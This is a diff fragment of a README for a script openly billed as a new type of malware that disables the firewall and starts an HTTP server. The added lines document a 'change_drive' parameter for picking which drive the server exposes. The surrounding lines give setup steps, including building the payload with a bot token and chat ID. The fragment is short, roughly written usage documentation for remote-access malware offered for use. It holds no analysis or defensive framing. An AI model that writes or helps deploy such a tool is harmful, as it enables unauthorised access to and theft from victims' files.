@@ -9,6 +9,8 @@ New Type of malwares  this simple script will disable Firewall start http server
 # Install dependencies 
 $ python3 , pip
 $ py -3 -m pip install -r Req.txt
+$ in order to change the drive you accesing use this parametre change_drive?drive=$Drive
+
 # Building the payload
 
 $ Replace the bot token And Chatid Cred in the file
